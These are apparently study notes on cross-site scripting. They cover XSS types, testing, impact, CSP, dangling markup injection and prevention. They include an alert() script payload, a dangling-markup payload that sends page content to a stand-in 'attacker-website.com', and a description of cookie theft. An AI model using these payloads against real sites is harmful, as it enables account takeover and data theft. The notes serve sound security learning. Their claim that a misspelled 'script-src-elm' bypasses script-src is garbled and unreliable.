# Cross-site Scripting

## What is cross-site scripting?
XSS (Cross-Site Scripting) is a web security problem where an attacker gets a website to run their code in another user's browser.

Think of it like this:

A website lets users submit text, such as a comment.
The website displays that text without safely treating it as plain text.

An attacker submits something like:

```html
<script>alert("Hello")</script>
```
When another person views the comment, their browser may interpret it as code and execute it.

## Types of XSS
### Reflected XSS
- received from current HTTP request and includes that data in the response in an unsafe way.
- How to induce XSS?
    - place links on website controlled by the attacker.
    - sending link as email/tweet
- Generally self contained.
### Stored XSS
- Application receives the data from untrusted source and later includes it in the HTTP response

### DOM-based XSS
- unsafe javascript data is passed to a sink that supports dynamic code execution (`eval` or `innerHTML`)
- most common source of DOM XSS is URL
- Testing for DOM XSS
    - **Test for DOM XSS:** Insert a random alphanumeric string into a source like `location.search`, then inspect the HTML in DevTools to see where it appears.
    - If the data gets URL encoded before being processed, then XSS is unlikely to work.
    - **Testing JavaScript execution sinks:** It is hard to find. Use JS debugger to test for JS sinks
    - On modern browsers, `innerHTML` does not execute `<script>` and `svg onload events` also won’t fire. Testing may involve elements such as `<img>` or `<iframe>` along with  Event handlers like `onload` or `onerror`
    - **DOM XSS in jQuery:** `attr()` changes attributes of DOM elements.

## What can XSS be used for?
An attacker who exploits a XSS vulnerability is typically able to:

- Impersonate or masquerade as the victim user.
- Carry out any action that the user is able to perform.
- Read any data that the user is able to access.
- Capture the user's login credentials.
- Perform virtual defacement of the web site.
- Inject trojan functionality into the web site.

## Impact of XSS vulnerabilities
- In a brochureware application, where all users are anonymous and all information is public, the impact will often be minimal.
- In an application holding sensitive data, such as banking transactions, emails, or healthcare records, the impact will usually be serious.
- If the compromised user has elevated privileges within the application, then the impact will generally be critical, allowing the attacker to take full control of the vulnerable application and compromise all users and their data.

## How to find and test for XSS vulnerabilities
- Submit unique input into every entry point in the application.
- When testing for reflected and stored XSS, a key task is to identify the XSS context:
    - location within the response where attacker-controllable data appears.
    - any input validation or processing that is being performed on the data by the application

## Content security policy
- Content security policy (CSP) is a browser mechanism that aims to mitigate the impact of cross-site scripting and some other vulnerabilities
- CSP can be circumvented to enable exploitation of the underlying vulnerability.
- It works by restricting resources (such as scripts and imges) that a page can load  and restricting whether a page can be framed by other pages.
- you can bypass the `script-src` direcive using `script-src-elm`. `script-src-elm` overwrites the existing `script-src`.
- You can protect againt clickjacking by using `frame-ancestors 'none'`. This prevents any page to frame your page.

## Dangling markup injection
- Dangling markup injection = injecting incomplete HTML that causes the browser to accidentally treat surrounding page content as part of the attacker-controlled markup.
- For example, the attacker passes a value like `"><img src='//attacker-website.com?`. The payload created a `img` tag and defines the start of `src`.  **Note the `src` doesn't have a closing quote`'`** when the browser parses, it picks all the characters as part of the src until a `'` is encountered. Everything until `'` is considered as a URL and will be passed to the attacker-website as a query param. Any alphanumeric characters will be URL encoded.
- Prevent dangling markup attacks:
    - encoding data on output and validating input on arrival
    - use CSP.

## Exploiting XSS vulnerabilities
### Stealing Cookies
- send the victim's cookies to your own domain, then manually inject the cookies into the browser and impersonate the victim.
### Capture passwords
### Stealing CSRF tokens

## How to prevent XSS attacks
- Filter input on arrival
- Encode data on output. At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content.
- Use appropriate response headers. To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the `Content-Type` and `X-Content-Type-Options` headers to ensure that browsers interpret the responses in the way you intend.
- Content Security Policy